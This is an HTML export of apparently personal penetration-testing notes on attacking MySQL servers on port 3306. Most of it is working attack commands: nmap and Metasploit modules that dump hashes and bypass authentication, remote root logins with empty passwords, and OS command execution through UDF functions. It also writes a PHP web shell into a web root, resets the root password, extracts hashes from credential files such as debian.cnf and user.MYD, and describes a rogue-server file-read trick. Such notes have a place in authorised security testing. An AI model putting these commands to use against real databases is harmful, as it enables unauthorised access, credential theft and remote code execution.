<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>3306 - MySQL</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><strong><h1># Port 3306 - MySQL</h1></strong><br />• <a href="https://devhints.io/mysql">https://devhints.io/mysql</a> - MySQL commands cheat sheet<br /><br />MySQL runs on port 3306.<br />If properly configured, remote access to mysql database should never be enabled.<br />If it is, you might be able to do some damage.<br /><br />Everything listed below you can also do locally on a linux system.<br /><br /><strong><h2>## Checklist</h2></strong><br /><strong><h3>### Recon</h3></strong><br />• Gather info<br />   ◇ Nmap<br />      ▪ <code>nmap -sV -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 &lt;IP&gt;</code><br />   ◇ Metasploit<br />      ▪ <div class="codebox"><div class="codebox">msf&gt;&nbsp;use&nbsp;auxiliary/scanner/mysql/mysql_version<br />msf&gt;&nbsp;use&nbsp;uxiliary/scanner/mysql/mysql_authbypass_hashdump<br />msf&gt;&nbsp;use&nbsp;auxiliary/scanner/mysql/mysql_hashdump&nbsp;#Requires&nbsp;creds<br />msf&gt;&nbsp;use&nbsp;auxiliary/admin/mysql/mysql_enum&nbsp;#Requires&nbsp;creds<br />msf&gt;&nbsp;use&nbsp;auxiliary/scanner/mysql/mysql_schemadump&nbsp;#Requires&nbsp;creds&nbsp;<br />msf&gt;&nbsp;use&nbsp;exploit/windows/mysql/mysql_start_up&nbsp;#Execute&nbsp;commands&nbsp;Windows,&nbsp;Creds</div></div><br />• Connect<br />   ◇ Local<br />      ▪ <code>mysql -u root</code><br />      ▪ <code>mysql -u root -p</code><br />   ◇ Remote<br />      ▪ <code>mysql -h -u root</code><br />      ▪ <code>mysql -h &lt;target ip&gt; -u root@localhost<br /></code>      ▪ <code>mysql -h &lt;target ip&gt; -u &quot;&quot;@localhost</code><br />      ▪ <code>telnet 192.168.0.1 3306</code><br />• Brute-force<br /><br /><strong><h3>## With access</h3></strong><br />• Extract usernames, passwords, and hashes<br />• Try to execute commands<br />   ◇ <code>select do_system(‘id’);</code><br />   ◇ <code>select sys_exec(&#39;&lt;command&gt;&#39;);</code> - UDF injection<br />   ◇ Local only - <code>\! whoami​</code><br />• Read file<br />   ◇ <code>select load_file(&#39;/var/lib/mysql-files/key.txt&#39;);</code><br />• Write file<br />   ◇ <code>select 1,2,&quot;&lt;?php echo shell_exec($_GET[&#39;c&#39;]);?&gt;&quot;,4 into OUTFILE &#39;C:/xampp/htdocs/back.php&#39;</code><br />• Change MySQL root password<br />   ◇ <div class="codebox"><div class="codebox">UPDATE&nbsp;mysql.user&nbsp;SET&nbsp;Password=PASSWORD(&#39;MyNewPass&#39;)&nbsp;WHERE&nbsp;User=&#39;root&#39;;<br />UPDATE&nbsp;mysql.user&nbsp;SET&nbsp;authentication_string=PASSWORD(&#39;MyNewPass&#39;)&nbsp;WHERE&nbsp;User=&#39;root&#39;;<br />FLUSH&nbsp;PRIVILEGES;<br />quit;</div></div><br /><br /><strong><h2>## Config Files</h2></strong><br /><strong>Windows</strong><br />• config.ini<br />• my.ini<br />   ◇ windows\my.ini<br />   ◇ winnt\my.ini<br />• &lt;install dir&gt;/mysql/data/<br /><br /><strong>Unix</strong><br />• my.cnf<br />   ◇ /etc/my.cnf<br />   ◇ /etc/mysql/my.cnf<br />   ◇ /var/lib/mysql/my.cnf<br />   ◇ ~/.my.cnf<br /><br /><strong><h2>## Interesting local files</h2></strong><br />• Try finding login credentials for MySQL in the server&#39;s website files (when you have local access)<br />• <code>/etc/mysql/debian.cnf</code><br />   ◇ Contains plain-text password of <code>debian-sys-maint</code> user<br />   ◇ Can be used to log into the mysql database<br />• <code>/var/lib/mysql/mysql/user.MYD</code><br />   ◇ Contains the hashes of the MySQL users (from the mysql.user table)<br />   ◇ Extract them - <code>grep -oaE &quot;[-_\.\*a-Z0-9]{3,}&quot; /var/lib/mysql/mysql/user.MYD | grep -v &quot;mysql_native_password&quot;</code><br />• Command History <br />   ◇ <code>~/.mysql.history</code><br />• Log Files<br />   ◇ connections.log<br />   ◇ update.log<br />   ◇ common.log<br /><br /><strong><h2>## Tricks</h2></strong><br /><strong><h3>### Write binary data into database</h3></strong><br /><div class="codebox"><div class="codebox">CONVERT(unhex(&quot;6f6e2e786d6c55540900037748b75c7249b75&quot;),&nbsp;BINARY)<br />CONVERT(from_base64(&quot;aG9sYWFhCg==&quot;),&nbsp;BINARY)</div></div><br /><br /><strong><h3>### UDF Injection</h3></strong><br />If the UDF plugin is installed, MySQL can run system commands. <br />If you&#39;re logged in as root to mysql, you&#39;ll be able to run commands with root privileges.<br /><br /><code>select sys_exec(&#39;&lt;command&gt;&#39;);</code><br /><br /><strong><h3>### Arbitrary read file by client</h3></strong><br />When you try to load data local into a table the content of a file the MySQL or MariaDB, the server asks the client to read the file and send the content. If you can tamper a MySQL client to connect to your own MyQSL server, you can read arbitrary files.<br /><br />• Initial PoC - <a href="https://github.com/allyshka/Rogue-MySql-Server">https://github.com/allyshka/Rogue-MySql-Server</a><br />• Overview - <a href="http://russiansecurity.expert/2016/04/20/mysql-connect-file-read/">http://russiansecurity.expert/2016/04/20/mysql-connect-file-read/</a><br />• Complete description + RCE - <a href="https://paper.seebug.org/1113/">https://paper.seebug.org/1113/</a><br /></div>
</body>
</html>
